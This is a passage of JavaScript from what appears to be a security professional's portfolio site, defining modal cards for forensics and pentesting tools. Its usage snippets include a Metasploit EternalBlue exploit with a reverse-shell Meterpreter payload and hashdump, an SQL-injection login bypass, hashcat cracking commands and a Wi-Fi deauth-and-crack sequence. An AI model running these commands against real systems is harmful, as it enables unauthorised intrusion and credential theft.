// Animate progress bars on scroll
  const observer = new IntersectionObserver((entries) => {
    entries.forEach(e => {
      if (e.isIntersecting) {
        e.target.style.width = e.target.dataset.width;
      }
    });
  }, { threshold: 0.2 });

  document.querySelectorAll('.thm-bar-fill').forEach(bar => {
    const w = bar.style.width;
    bar.dataset.width = w;
    bar.style.width = '0';
    observer.observe(bar);
  });

  // ── Writeup Modal ──
  const wOverlay = document.getElementById('wOverlay');
  const wModal   = document.getElementById('wModal');
  const wBody    = document.getElementById('wModalBody');
  const wBread   = document.getElementById('wModalBreadcrumb');

  const writeupLabels = {
    blue:    'BLUE — ETERNALBLUE',
    invwin:  'INVESTIGATING WINDOWS',
    memfor:  'MEMORY FORENSICS',
    pickle:  'PICKLE RICK',
    pcap:    'NETWORK ANALYSIS',
    adpen:   'ACTIVE DIRECTORY',
    'rm-blue':  'ROOM · BLUE',
    'rm-vol':   'ROOM · VOLATILITY',
    'rm-crypt': 'ROOM · CRYPTO101',
    'rm-owasp': 'ROOM · OWASP TOP 10',
    'rm-osint': 'ROOM · OSINT',
    'rm-lpe':   'ROOM · LINUX PRIVESC',
    'rm-ad':    'ROOM · ACTIVE DIRECTORY',
    'rm-mal':   'ROOM · MALWARE ANALYSIS',
    'rm-ws':    'ROOM · WIRESHARK',
    'rm-jrpt':  'ROOM · JR PENTESTER',
    'rm-soc':   'ROOM · SOC LEVEL 1',
    'rm-ir':    'ROOM · INCIDENT RESPONSE',
    'cert-ceh':   'CREDENTIAL · CEH v12',
    'cert-chfi':  'CREDENTIAL · CHFI',
    'cert-nvhdf': 'CREDENTIAL · NVH DIGITAL FORENSIC',
    'cert-eh101': 'CREDENTIAL · ETHICAL HACKING 101'
  };

  function openWriteup(id) {
    const tmpl = document.getElementById('wp-' + id);
    if (!tmpl) return;
    wBody.innerHTML = tmpl.innerHTML;
    wBread.textContent = writeupLabels[id] || 'WRITEUP';
    wOverlay.classList.add('open');
    wModal.classList.add('open');
    document.body.style.overflow = 'hidden';
    wModal.scrollTop = 0;
  }

  function closeWriteup() {
    wOverlay.classList.remove('open');
    wModal.classList.remove('open');
    document.body.style.overflow = '';
  }

  // Nav active highlight
  const sections = document.querySelectorAll('section[id]');
  const navLinks = document.querySelectorAll('nav a');
  window.addEventListener('scroll', () => {
    let current = '';
    sections.forEach(s => {
      if (window.scrollY >= s.offsetTop - 100) current = s.id;
    });
    navLinks.forEach(a => {
      const href = a.getAttribute('href');
      if (href === '#' + current) {
        a.style.color = 'var(--blue)';
      } else if (!a.classList.contains('nav-cta')) {
        a.style.color = '';
      }
    });
  });
  // ── Tool Modal ──
  const toolData = {
    autopsy: {
      icon: '🔬', name: 'Autopsy', cat: 'Digital Forensics · GUI Platform',
      summary: 'Autopsy is an open-source digital forensics platform and the graphical interface to The Sleuth Kit. It is widely used by law enforcement, corporate investigators, and security researchers to examine hard drives, disk images, and mobile devices. I use Autopsy as my primary triage platform when analysing disk images from compromised systems.',
      features: [
        { icon: '🗂️', title: 'File System Analysis', desc: '<strong>File system analysis</strong> — navigates NTFS, FAT, Ext4, and HFS+ partitions; recovers deleted files and unallocated space; displays full directory trees with MAC timestamps.' },
        { icon: '🔍', title: 'Keyword Search', desc: '<strong>Keyword & regex search</strong> — indexes the entire image and runs concurrent keyword lists across all file content, including carved fragments and file slack space.' },
        { icon: '⏱️', title: 'Timeline Analysis', desc: '<strong>Timeline generation</strong> — aggregates file MAC times, log entries, browser history, and registry timestamps into a single unified event timeline for attack reconstruction.' },
        { icon: '🧩', title: 'Hash Filtering', desc: '<strong>Hash filtering</strong> — auto-flags known malware via NSRL and custom hash sets; filters out known-good system files so analysis focuses on what actually matters.' },
        { icon: '🌐', title: 'Web Artifacts', desc: '<strong>Web artifact extraction</strong> — parses Chrome, Firefox, Edge, and IE history, downloads, cookies, and cached content automatically without manual SQLite querying.' },
        { icon: '📧', title: 'Email & Registry', desc: '<strong>Email & registry parsing</strong> — ingests PST/OST mailboxes and Windows registry hives for user activity, installed programs, USB history, and network connections.' },
      ],
      usage: {
        label: 'kali@forensics — autopsy',
        code: `<span class="cmd">autopsy &amp;</span>                          <span class="cmt"># launch GUI on localhost:9999</span>
<span class="out">→ Create New Case → Add Data Source → Disk Image (.dd/.E01/.vmdk)</span>
<span class="out">→ Run Ingest Modules: Hash Lookup, Keyword Search, File Type ID</span>
<span class="hi">→ Results tree: Deleted Files, Web History, Recent Documents, USB Devices</span>
<span class="warn"># Export timeline: Generate Timeline → Body file → mactime output</span>`
      },
      skills: [['Evidence Acquisition', '100%'], ['File Carving', '95%'], ['Timeline Analysis', '90%'], ['Report Writing', '90%']],
      tags: ['DFIR', 'Disk Forensics', 'File Carving', 'Timeline', 'Deleted Files', 'GUI']
    },
    volatility: {
      icon: '🧠', name: 'Volatility 3', cat: 'Memory Forensics · CLI Framework',
      summary: 'Volatility is the industry-standard open-source memory forensics framework. It analyses RAM dumps from Windows, Linux, and macOS systems to extract processes, network connections, loaded drivers, registry hives, and injected code — all without booting the system. I use Volatility 3 extensively for malware triage and incident response memory analysis.',
      features: [
        { icon: '⚙️', title: 'Process Analysis', desc: '<strong>Process analysis</strong> — pstree and psscan enumerate running and hidden processes; cross-referencing both detects DKOM-hidden rootkit processes invisible to the OS.' },
        { icon: '💉', title: 'Injection Detection', desc: '<strong>Code injection detection</strong> — malfind identifies memory regions marked PAGE_EXECUTE_READWRITE containing PE headers, the hallmark signature of process injection and shellcode.' },
        { icon: '🌐', title: 'Network Artefacts', desc: '<strong>Network connection recovery</strong> — netstat reads connection pool memory to reconstruct active and recently closed TCP/UDP connections even after the process exits.' },
        { icon: '🔑', title: 'Credential Extraction', desc: '<strong>Credential extraction</strong> — hashdump and lsadump pull NTLM password hashes, LSA secrets, and cached domain credentials directly from LSASS memory.' },
        { icon: '📂', title: 'File & Registry', desc: '<strong>File & registry access</strong> — filescan lists open file handles; printkey and hivelist expose loaded registry hives and their key-value content directly from memory.' },
        { icon: '🧾', title: 'Command History', desc: '<strong>Command history recovery</strong> — cmdline and consoles reconstruct every command run in CMD and PowerShell sessions, including those the attacker tried to clear.' },
      ],
      usage: {
        label: 'kali@forensics — volatility 3',
        code: `<span class="cmd">python3 vol.py -f memdump.raw windows.info</span>        <span class="cmt"># identify OS</span>
<span class="cmd">python3 vol.py -f memdump.raw windows.pstree</span>      <span class="cmt"># process tree</span>
<span class="cmd">python3 vol.py -f memdump.raw windows.malfind</span>     <span class="cmt"># injected code</span>
<span class="cmd">python3 vol.py -f memdump.raw windows.netstat</span>     <span class="cmt"># network connections</span>
<span class="cmd">python3 vol.py -f memdump.raw windows.hashdump</span>    <span class="cmt"># NTLM hashes</span>
<span class="hi">→ Output: suspicious svchost PID 2496 — PE injected, ESTABLISHED → 185.220.101.47:443</span>`
      },
      skills: [['Plugin Usage', '90%'], ['IOC Extraction', '88%'], ['Malware ID', '85%'], ['Report Writing', '90%']],
      tags: ['Memory Forensics', 'DFIR', 'Malware', 'Process Injection', 'Credentials', 'Python']
    },
    ftk: {
      icon: '💾', name: 'FTK Imager', cat: 'Evidence Acquisition · Imaging Tool',
      summary: 'FTK Imager is the gold-standard free tool from AccessData for forensically sound evidence acquisition. It creates bitstream images of physical drives, logical volumes, and removable media while generating hash verification values to guarantee chain-of-custody integrity. I use FTK Imager as the first step in every forensic investigation before any analysis begins.',
      features: [
        { icon: '💿', title: 'Forensic Imaging', desc: '<strong>Forensic imaging</strong> — creates E01 (Expert Witness), DD (raw), AD1, and AFF4 image formats from physical disks, logical drives, USB devices, and memory cards.' },
        { icon: '🔒', title: 'Hash Verification', desc: '<strong>Hash verification</strong> — simultaneously computes MD5 and SHA1 hashes during acquisition and embeds them in the image log; re-verification proves the image was never modified.' },
        { icon: '🧊', title: 'Write Blocking', desc: '<strong>Write-block awareness</strong> — works with hardware write blockers to guarantee zero writes to the original evidence device, satisfying legal chain-of-custody requirements.' },
        { icon: '🔍', title: 'Live Preview', desc: '<strong>Live evidence preview</strong> — mounts images in read-only mode to browse files, view deleted items, and export specific files without modifying the image.' },
        { icon: '💭', title: 'Memory Capture', desc: '<strong>Memory acquisition</strong> — captures a full RAM dump from a live Windows system for subsequent Volatility analysis, preserving volatile evidence before shutdown.' },
        { icon: '📋', title: 'Custom Reports', desc: '<strong>Acquisition reports</strong> — auto-generates a signed acquisition report with source drive details, timestamps, hash values, and investigator information for court submission.' },
      ],
      usage: {
        label: 'FTK Imager — acquisition workflow',
        code: `<span class="out">File → Create Disk Image → Physical Drive → Select source device</span>
<span class="out">Add Destination → E01 format → Set segment size: 2GB</span>
<span class="out">Case Number, Examiner Name, Evidence ID → Start</span>
<span class="hi">→ MD5:  a3b4c1d9e5f2a0b7c8d4e1f3a5b2c9d6</span>
<span class="hi">→ SHA1: 7f3e8b1c4a9d2f6e0b5c8a3d7f2e9b4c1a6d3f8e</span>
<span class="warn"># Verify: re-hash the E01 → hashes must match exactly</span>`
      },
      skills: [['Disk Imaging', '100%'], ['Chain of Custody', '100%'], ['Memory Capture', '95%'], ['Evidence Preview', '90%']],
      tags: ['Evidence Acquisition', 'E01', 'Chain of Custody', 'DFIR', 'Disk Imaging', 'Memory Dump']
    },
    wireshark: {
      icon: '🦈', name: 'Wireshark', cat: 'Network Forensics · Packet Analyser',
      summary: 'Wireshark is the world\'s most widely-used network protocol analyser. It captures live network traffic and dissects hundreds of protocols in real time, making it indispensable for network forensics, C2 detection, malware traffic analysis, and troubleshooting. I use Wireshark and its CLI companion tshark for PCAP analysis in CTFs, incident response, and lab work.',
      features: [
        { icon: '📡', title: 'Live Capture', desc: '<strong>Live packet capture</strong> — captures traffic on any interface (Ethernet, Wi-Fi, loopback) using BPF capture filters to target only relevant traffic from the first packet.' },
        { icon: '🔎', title: 'Display Filters', desc: '<strong>Powerful display filters</strong> — Wireshark\'s filter language lets you isolate any protocol field; e.g. http.request.method=="POST" or dns.qry.name contains "evil".' },
        { icon: '🌊', title: 'Stream Following', desc: '<strong>Stream reconstruction</strong> — follow TCP/UDP/HTTP streams to read full application-layer conversations in plaintext, revealing credentials, commands, and exfiltrated data.' },
        { icon: '📦', title: 'Object Export', desc: '<strong>File object extraction</strong> — exports files transferred over HTTP, SMB, FTP, and DICOM directly from the PCAP; SHA256-verify exported binaries against VirusTotal.' },
        { icon: '📊', title: 'Traffic Statistics', desc: '<strong>Traffic statistics</strong> — Protocol Hierarchy, Conversations, Endpoints, and I/O graphs rapidly identify dominant talkers, unusual protocols, and beacon intervals.' },
        { icon: '⌨️', title: 'tshark CLI', desc: '<strong>tshark automation</strong> — the CLI version enables scripted analysis, field extraction with -T fields -e, and integration into Python or Bash forensics pipelines.' },
      ],
      usage: {
        label: 'tshark — C2 beacon detection',
        code: `<span class="cmd">tshark -r capture.pcap -q -z conv,tcp | sort -k1 -rn | head -10</span>
<span class="hi">192.168.1.105 → 185.220.101.47:80   Frames:88   Bytes:1.2MB</span>
<span class="cmd">tshark -r capture.pcap -Y 'http.host=="185.220.101.47"' -T fields -e frame.time -e http.request.uri</span>
<span class="hi">14:02:01  GET /gate.php?id=host&amp;os=win7&amp;av=0</span>
<span class="hi">14:03:01  GET /gate.php?id=host&amp;os=win7&amp;av=0</span>
<span class="warn"># Beacon interval: ~60s ± 0.5s → Zeus/ZBot C2 pattern</span>`
      },
      skills: [['Display Filters', '100%'], ['PCAP Analysis', '95%'], ['C2 Detection', '92%'], ['File Extraction', '90%']],
      tags: ['Network Forensics', 'PCAP', 'C2 Detection', 'tshark', 'Protocol Analysis', 'IOC']
    },
    nmap: {
      icon: '🔍', name: 'Nmap', cat: 'Reconnaissance · Port Scanner',
      summary: 'Nmap (Network Mapper) is the de-facto standard open-source network scanner used by security professionals worldwide. It discovers hosts, enumerates open ports, fingerprints services and OS versions, and runs scripted vulnerability checks — all in one tool. I use Nmap at the start of every penetration test and CTF challenge to map the attack surface.',
      features: [
        { icon: '🚪', title: 'Port Scanning', desc: '<strong>Port scanning modes</strong> — SYN scan (-sS) for speed and stealth, Connect scan (-sT) when unprivileged, UDP scan (-sU) to catch DNS/SNMP/DHCP services often overlooked.' },
        { icon: '🧩', title: 'Service Detection', desc: '<strong>Service & version detection</strong> — -sV sends protocol-specific probes and matches banners to a database of 11,000+ service signatures, identifying exact software versions.' },
        { icon: '💻', title: 'OS Fingerprinting', desc: '<strong>OS fingerprinting</strong> — -O analyses TCP/IP stack behaviour (TTL, window size, sequence numbers) to identify the target OS and version with confidence percentages.' },
        { icon: '📜', title: 'NSE Scripts', desc: '<strong>Nmap Scripting Engine (NSE)</strong> — 600+ scripts for vulnerability detection (--script vuln), brute-forcing, service enumeration, and exploitation assistance.' },
        { icon: '🌐', title: 'Network Discovery', desc: '<strong>Host discovery</strong> — ping sweeps, ARP scans on local subnets, and traceroute integration to map live hosts across entire subnets before targeting specific machines.' },
        { icon: '⚡', title: 'Speed Tuning', desc: '<strong>Timing templates</strong> — -T0 to -T5 control scan aggressiveness; -T4 for standard pentests, -T1 for IDS evasion; --min-rate and --max-retries for fine-grained control.' },
      ],
      usage: {
        label: 'kali@forensics — nmap recon',
        code: `<span class="cmd">nmap -sV -sC -O -p- --min-rate 5000 -oA scan_results 10.10.x.x</span>
<span class="hi">PORT     STATE  SERVICE   VERSION</span>
<span class="hi">22/tcp   open   ssh       OpenSSH 7.4 (Ubuntu)</span>
<span class="hi">80/tcp   open   http      Apache 2.4.18</span>
<span class="hi">445/tcp  open   smb       Windows 7 SP1</span>
<span class="cmd">nmap --script vuln -p 445 10.10.x.x</span>
<span class="warn">→ VULNERABLE: smb-vuln-ms17-010 (CVE-2017-0143)</span>`
      },
      skills: [['Port Scanning', '100%'], ['Service Enumeration', '100%'], ['NSE Scripts', '92%'], ['OS Detection', '88%']],
      tags: ['Reconnaissance', 'Port Scanning', 'NSE', 'Vulnerability Detection', 'OSCP', 'Pentesting']
    },
    metasploit: {
      icon: '💣', name: 'Metasploit Framework', cat: 'Exploitation · Post-Exploitation',
      summary: 'The Metasploit Framework is the world\'s most used penetration testing platform. It provides a library of 2,000+ exploit modules, payloads, and post-exploitation tools in a unified console. I use Metasploit for authorised penetration tests and CTF challenges — from initial exploitation through to credential dumping and lateral movement.',
      features: [
        { icon: '💥', title: 'Exploit Modules', desc: '<strong>Exploit library</strong> — 2,000+ modules covering CVEs across Windows, Linux, web applications, IoT, and network devices; modules are ranked by reliability and impact.' },
        { icon: '🐚', title: 'Meterpreter', desc: '<strong>Meterpreter payload</strong> — an advanced in-memory agent that provides file system access, process management, screenshot capture, keylogging, pivoting, and credential dumping without touching disk.' },
        { icon: '🔼', title: 'Privilege Escalation', desc: '<strong>Post-exploitation modules</strong> — getsystem attempts token impersonation and named pipe exploitation to escalate to SYSTEM; local_exploit_suggester recommends kernel exploits based on OS patch level.' },
        { icon: '🔄', title: 'Pivoting', desc: '<strong>Network pivoting</strong> — route and socks_proxy modules allow attackers to tunnel traffic through a compromised host into segregated internal networks, enabling lateral movement.' },
        { icon: '🧪', title: 'Auxiliary Modules', desc: '<strong>Auxiliary modules</strong> — scanners (SMB, SSH, FTP brute-force), fuzzers, credential sprayers, and service enumerators that work independently of exploits.' },
        { icon: '🗃️', title: 'Database Integration', desc: '<strong>PostgreSQL workspace</strong> — stores hosts, services, vulnerabilities, and credentials from every engagement; db_nmap imports Nmap results directly into the Metasploit database.' },
      ],
      usage: {
        label: 'msfconsole — EternalBlue',
        code: `<span class="cmd">msfconsole -q</span>
<span class="cmd">use exploit/windows/smb/ms17_010_eternalblue</span>
<span class="cmd">set RHOSTS 10.10.x.x ; set LHOST 10.10.y.y</span>
<span class="cmd">set payload windows/x64/meterpreter/reverse_tcp ; run</span>
<span class="hi">[+] Meterpreter session 1 opened — NT AUTHORITY\\SYSTEM</span>
<span class="cmd">hashdump</span>
<span class="hi">Administrator:500:aad3b435:31d6cfe0d16ae931b73c59d7e0c089c0:::</span>`
      },
      skills: [['Module Usage', '88%'], ['Meterpreter', '90%'], ['Post-Exploitation', '85%'], ['Payload Crafting', '80%']],
      tags: ['Exploitation', 'Meterpreter', 'Post-Exploitation', 'CVE', 'Pivoting', 'Pentesting']
    },
    burp: {
      icon: '🕸️', name: 'Burp Suite', cat: 'Web Application Security · Proxy',
      summary: 'Burp Suite is the leading toolkit for web application security testing. Its intercepting proxy sits between the browser and server, giving full visibility and control over every HTTP/S request and response. I use Burp Suite for all web-based CTF challenges and web application penetration tests — from parameter tampering to complex injection chains.',
      features: [
        { icon: '🔁', title: 'Intercepting Proxy', desc: '<strong>HTTP/S proxy</strong> — intercepts and modifies every request and response in real time; essential for manipulating parameters, cookies, headers, and hidden form fields the browser never exposes.' },
        { icon: '🔁', title: 'Repeater', desc: '<strong>Repeater</strong> — resend any captured request with modifications and compare responses side-by-side; the primary tool for manually testing SQL injection, XSS, SSRF, and authentication bypass.' },
        { icon: '💀', title: 'Intruder', desc: '<strong>Intruder</strong> — automated fuzzer for brute-forcing login forms, fuzzing parameters with wordlists, and enumerating IDs (IDOR testing) with sniper, battering ram, and cluster bomb attack modes.' },
        { icon: '🕷️', title: 'Spider / Scanner', desc: '<strong>Active scanner (Pro)</strong> — crawls the entire application and actively tests for SQLi, XSS, XXE, SSRF, command injection, and deserialization vulnerabilities with low false-positive rates.' },
        { icon: '🔍', title: 'Decoder', desc: '<strong>Decoder / Comparer</strong> — rapidly encodes/decodes Base64, URL, HTML, hex, and gzip; the Comparer diffs two responses to spot subtle differences that reveal injection or logic flaws.' },
        { icon: '🧩', title: 'Extensions', desc: '<strong>BApp extensions</strong> — Turbo Intruder (high-speed fuzzing), JWT Editor (token manipulation), Logger++ (advanced logging), and CORS* extend Burp\'s capabilities for specialist attacks.' },
      ],
      usage: {
        label: 'Burp Suite — SQLi discovery',
        code: `<span class="out">Proxy → Intercept ON → browse target → capture login POST</span>
<span class="out">Right-click → Send to Repeater</span>
<span class="cmd">POST /login HTTP/1.1
username=admin'--&amp;password=anything</span>
<span class="hi">HTTP/1.1 200 OK  → Logged in as admin</span>
<span class="cmt"># Single quote breaks SQL → comment truncates password check</span>
<span class="warn"># Send to Intruder → fuzz password field with rockyou.txt</span>`
      },
      skills: [['Proxy & Intercept', '90%'], ['Manual SQLi/XSS', '88%'], ['Intruder Fuzzing', '85%'], ['Decoder/Comparer', '92%']],
      tags: ['Web App Testing', 'Proxy', 'SQLi', 'XSS', 'IDOR', 'SSRF', 'Fuzzing']
    },
    kali: {
      icon: '🐉', name: 'Kali Linux', cat: 'Security OS · Daily Driver Platform',
      summary: 'Kali Linux is the industry-standard Debian-based Linux distribution purpose-built for penetration testing, digital forensics, and red team operations. Maintained by Offensive Security, it ships with 600+ pre-installed security tools. Kali is my daily driver for all security work — CTFs, forensics investigations, lab environments, and tool development.',
      features: [
        { icon: '🛠️', title: '600+ Preinstalled Tools', desc: '<strong>600+ pre-installed tools</strong> — organised into categories: information gathering, vulnerability analysis, exploitation, post-exploitation, forensics, reverse engineering, social engineering, and reporting.' },
        { icon: '🔧', title: 'Custom Kernels', desc: '<strong>Hardened kernel patches</strong> — Kali ships with a custom kernel that includes wireless injection patches (for Aircrack-ng), support for more hardware adapters, and audit framework integration.' },
        { icon: '📦', title: 'Rolling Release', desc: '<strong>Rolling release model</strong> — constantly updated from Debian testing; security tools are always the latest version without needing to reinstall the OS, unlike point-release distros.' },
        { icon: '🖥️', title: 'Deployment Flexibility', desc: '<strong>Flexible deployment</strong> — runs as a VM (VMware/VirtualBox), Docker container, WSL2 on Windows, live USB (persistence-enabled), Raspberry Pi, or cloud instance on AWS/Azure.' },
        { icon: '🧑‍💻', title: 'Forensics Mode', desc: '<strong>Forensics boot mode</strong> — boots without mounting any drives or enabling swap, preventing contamination of evidence media; ideal for live forensic examination of seized devices.' },
        { icon: '📡', title: 'Wireless Arsenal', desc: '<strong>Wireless security tools</strong> — Aircrack-ng, Kismet, Reaver, and hostapd-wpe for WPA/WPA2 cracking, rogue AP attacks, and wireless network auditing out of the box.' },
      ],
      usage: {
        label: 'kali@forensics:~',
        code: `<span class="cmd">kali-tweaks</span>                        <span class="cmt"># configure shell, network, metapackages</span>
<span class="cmd">sudo apt install kali-linux-everything</span> <span class="cmt"># full tool suite</span>
<span class="cmd">searchsploit ms17-010</span>              <span class="cmt"># search local exploit-db</span>
<span class="hi">EDB-ID 42315 | Windows SMB Remote Code Execution (MS17-010)</span>
<span class="cmd">msfdb init &amp;&amp; msfconsole</span>          <span class="cmt"># initialise Metasploit DB</span>
<span class="warn"># Forensics mode: boot with "forensics" at GRUB — no disk mounts</span>`
      },
      skills: [['Command Line', '100%'], ['Tool Navigation', '100%'], ['Scripting/Automation', '88%'], ['System Hardening', '82%']],
      tags: ['Linux', 'Pentesting OS', 'Forensics Mode', 'Rolling Release', '600+ Tools', 'Daily Driver']
    },
    hashcat: {
      icon: '🔐', name: 'Hashcat', cat: 'Password Cracking · GPU Accelerated',
      summary: 'Hashcat is the world\'s fastest and most advanced password recovery tool, leveraging GPU acceleration to crack hashes orders of magnitude faster than CPU-based crackers. It supports 300+ hash types and dozens of attack modes. I use Hashcat to crack NTLM hashes from Meterpreter hashdumps, Kerberos TGS tickets from Kerberoasting, and challenge hashes in CTFs.',
      features: [
        { icon: '⚡', title: 'GPU Acceleration', desc: '<strong>GPU acceleration</strong> — uses OpenCL and CUDA to leverage thousands of GPU cores simultaneously; a modern GPU cracks MD5 at 60+ billion hashes per second vs a CPU\'s 1 billion.' },
        { icon: '📚', title: '300+ Hash Types', desc: '<strong>300+ supported algorithms</strong> — MD5 (-m 0), SHA1 (-m 100), NTLM (-m 1000), NetNTLMv2 (-m 5600), bcrypt (-m 3200), Kerberos TGS (-m 13100), WPA2 (-m 22000), and more.' },
        { icon: '⚔️', title: 'Attack Modes', desc: '<strong>Multiple attack modes</strong> — dictionary (-a 0), combinator (-a 1), brute-force mask (-a 3), hybrid wordlist+mask (-a 6), and rule-based attacks to maximise crack rate with minimal time.' },
        { icon: '📝', title: 'Rule Engine', desc: '<strong>Rule-based mutation</strong> — applies transformation rules (append digits, capitalise, leet-speak substitution) to wordlist candidates; rockyou-30000.rule covers the most common real-world passwords.' },
        { icon: '🎯', title: 'Mask Attacks', desc: '<strong>Mask attacks</strong> — custom character sets for targeted brute-force; e.g. ?u?l?l?l?l?d?d?d?s targets patterns like "Password123!" matching corporate password policies.' },
        { icon: '💾', title: 'Session Management', desc: '<strong>Session restore</strong> — --session and --restore allow long-running jobs to be paused and resumed; --status shows live crack rate, progress percentage, and ETA.' },
      ],
      usage: {
        label: 'hashcat — multi-mode examples',
        code: `<span class="cmd">hashcat -m 1000 ntlm.txt rockyou.txt</span>                 <span class="cmt"># NTLM dictionary</span>
<span class="cmd">hashcat -m 13100 kerb.hash rockyou.txt -r best64.rule</span>  <span class="cmt"># Kerberoast</span>
<span class="cmd">hashcat -m 22000 wpa.hc22000 rockyou.txt</span>             <span class="cmt"># WPA2 crack</span>
<span class="cmd">hashcat -m 0 md5.txt -a 3 ?u?l?l?l?d?d?d?s</span>          <span class="cmt"># mask attack</span>
<span class="hi">ffb43f0de35be4d9917ac0cc8ad57f8d:alqfna22</span>
<span class="warn"># Speed: NTLM ~14 GH/s on RTX 3090</span>`
      },
      skills: [['Dictionary Attacks', '92%'], ['Rule-Based', '88%'], ['Kerberoasting', '90%'], ['Mask Attacks', '82%']],
      tags: ['Password Cracking', 'GPU', 'NTLM', 'Kerberoasting', 'WPA2', 'CTF']
    },
    osint: {
      icon: '🌐', name: 'OSINT Framework', cat: 'Open-Source Intelligence · Recon',
      summary: 'The OSINT Framework is a structured methodology and toolset for gathering intelligence from publicly available sources — without ever touching the target directly. I use OSINT techniques for the reconnaissance phase of penetration tests, threat actor profiling, and pre-engagement attack surface mapping, combining multiple tools into a systematic intelligence workflow.',
      features: [
        { icon: '🔍', title: 'Google Dorking', desc: '<strong>Google advanced search operators</strong> — site:, filetype:, intitle:, inurl:, and cache: operators to surface exposed admin panels, sensitive PDFs, backup files, and indexed credentials.' },
        { icon: '🌍', title: 'Shodan', desc: '<strong>Shodan</strong> — searches internet-facing devices by banner, port, SSL certificate, organisation, and CVE tag; used to map the external attack surface and find vulnerable services before internal testing.' },
        { icon: '🧬', title: 'DNS Enumeration', desc: '<strong>DNS intelligence</strong> — dig, nslookup, and dnsx for zone transfers, subdomain brute-forcing, SPF/DMARC record analysis; theHarvester for email and subdomain harvesting from search engines.' },
        { icon: '📷', title: 'EXIF Metadata', desc: '<strong>Image metadata extraction</strong> — exiftool extracts GPS coordinates, device model, timestamps, and creator information from photos posted online, often revealing physical locations.' },
        { icon: '👤', title: 'Social Media', desc: '<strong>Social & email intelligence</strong> — LinkedIn enumeration for org structure and employee names, hunter.io for email pattern discovery, HaveIBeenPwned for breach exposure checks.' },
        { icon: '🕸️', title: 'Maltego Integration', desc: '<strong>Maltego transforms</strong> — automated graph-based link analysis connecting domains, IPs, emails, phone numbers, and social profiles into a visual relationship map for target profiling.' },
      ],
      usage: {
        label: 'kali@forensics — osint workflow',
        code: `<span class="cmd">theHarvester -d target.com -b google,bing,linkedin -f output</span>
<span class="hi">→ Emails: j.smith@target.com, admin@target.com</span>
<span class="hi">→ Subdomains: vpn.target.com, mail.target.com, dev.target.com</span>
<span class="cmd">exiftool photo.jpg | grep -E "GPS|Software|Creator"</span>
<span class="hi">GPS Latitude: 27° 42' 15.00" N    GPS Longitude: 85° 18' 45.00" E</span>
<span class="warn"># Google dork: site:target.com filetype:pdf "confidential"</span>`
      },
      skills: [['Google Dorking', '92%'], ['DNS Recon', '88%'], ['Shodan', '85%'], ['Social Profiling', '80%']],
      tags: ['OSINT', 'Reconnaissance', 'Shodan', 'DNS', 'Metadata', 'Google Dorking', 'theHarvester']
    },
    aircrack: {
      icon: '📡', name: 'Aircrack-ng', cat: 'Wireless Security · 802.11 Auditing',
      summary: 'Aircrack-ng is the complete open-source suite for 802.11 wireless network security assessment. It covers every phase of a wireless penetration test — from monitor mode and packet capture through deauthentication attacks, handshake capture, and offline WPA2 key cracking. I use Aircrack-ng for wireless security audits and CTF wireless challenges.',
      features: [
        { icon: '📻', title: 'Monitor Mode', desc: '<strong>Monitor mode setup</strong> — airmon-ng enables promiscuous capture on wireless adapters; the adapter receives all 802.11 frames on the channel, not just frames addressed to it.' },
        { icon: '👁️', title: 'Network Discovery', desc: '<strong>airodump-ng scanning</strong> — discovers all nearby access points and associated clients, showing SSID, BSSID, channel, signal strength, encryption type, and data frame counts.' },
        { icon: '💥', title: 'Deauth Attacks', desc: '<strong>Deauthentication injection</strong> — aireplay-ng sends forged 802.11 deauth frames to force clients to disconnect and reconnect, triggering a WPA2 4-way handshake capture.' },
        { icon: '🤝', title: 'Handshake Capture', desc: '<strong>4-way handshake capture</strong> — the WPA2 handshake contains a hash of the pre-shared key; captured with airodump-ng and saved as a .cap file for offline cracking.' },
        { icon: '🔓', title: 'WPA2 Cracking', desc: '<strong>Offline key cracking</strong> — aircrack-ng performs dictionary attacks against captured handshakes; convert to .hc22000 format with hcxtools for GPU cracking with Hashcat.' },
        { icon: '🔑', title: 'WEP Cracking', desc: '<strong>WEP statistical attacks</strong> — aireplay-ng performs ARP request replay to generate IVs; aircrack-ng statistically recovers the WEP key from ~40,000 IVs in minutes.' },
      ],
      usage: {
        label: 'kali@forensics — WPA2 audit',
        code: `<span class="cmd">airmon-ng start wlan0</span>                                   <span class="cmt"># enable monitor mode</span>
<span class="cmd">airodump-ng wlan0mon</span>                                    <span class="cmt"># discover networks</span>
<span class="cmd">airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon</span>
<span class="cmd">aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon</span>          <span class="cmt"># deauth → handshake</span>
<span class="hi">WPA handshake: AA:BB:CC:DD:EE:FF captured</span>
<span class="cmd">aircrack-ng capture.cap -w rockyou.txt</span>
<span class="hi">KEY FOUND! [ secretpassword123 ]</span>`
      },
      skills: [['Monitor Mode', '80%'], ['Handshake Capture', '82%'], ['WPA2 Cracking', '78%'], ['WEP Analysis', '70%']],
      tags: ['Wireless', '802.11', 'WPA2', 'Deauth', 'Monitor Mode', 'Handshake', 'Airmon-ng']
    },
    ghidra: {
      icon: '🧬', name: 'Ghidra / IDA Pro', cat: 'Reverse Engineering · Disassembler',
      summary: 'Ghidra is the NSA\'s open-source reverse engineering framework, and IDA Pro is the industry-standard commercial disassembler. Together they form the core of my malware analysis and binary exploitation workflow. I use Ghidra for static analysis of malware samples — decompiling functions, identifying anti-analysis techniques, and extracting obfuscated strings and C2 logic.',
      features: [
        { icon: '🔄', title: 'Decompilation', desc: '<strong>Decompiler</strong> — Ghidra\'s decompiler converts raw assembly into readable pseudo-C code, allowing rapid understanding of malware logic without reading every instruction manually.' },
        { icon: '🏗️', title: 'Multi-Architecture', desc: '<strong>Multi-arch support</strong> — disassembles x86, x86-64, ARM, MIPS, PowerPC, and more; supports PE, ELF, Mach-O, DEX, and raw binary formats for cross-platform malware analysis.' },
        { icon: '🕵️', title: 'String Extraction', desc: '<strong>String & import analysis</strong> — identifies hardcoded strings (C2 URLs, mutex names, registry keys), imported API calls, and obfuscated constants that reveal malware behaviour.' },
        { icon: '🔀', title: 'Control Flow', desc: '<strong>Control flow graphs</strong> — visualises function logic as node graphs; useful for identifying anti-debugging checks (GetTickCount, IsDebuggerPresent), sleep loops, and XOR decryption routines.' },
        { icon: '🧩', title: 'Scripting', desc: '<strong>Script automation</strong> — Ghidra\'s Java and Python API automates repetitive tasks: bulk-renaming variables, applying known decryption keys to XOR-encoded strings, and extracting configuration blobs.' },
